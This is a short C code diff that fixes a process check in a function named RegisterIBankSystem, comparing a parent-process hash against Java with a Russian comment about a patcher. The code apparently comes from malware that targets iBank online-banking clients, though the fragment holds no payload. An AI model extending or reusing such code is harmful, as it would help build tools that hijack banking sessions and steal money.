@@ -650,7 +650,7 @@ void RegisterIBankSystem(DWORD hashApp)
 			BOOL ParentIsJava = (hashParent == PROCESS_HASH_JAVA || 
 								hashParent == PROCESS_HASH_PATCHED_JAVA); // При работающем патчере запускается из под этого процесса
 		#else
-			BOOL ParentIsJava = (ParentPID == PROCESS_HASH_JAVA);
+			BOOL ParentIsJava = (hashParent == PROCESS_HASH_JAVA);
 		#endif
 
 
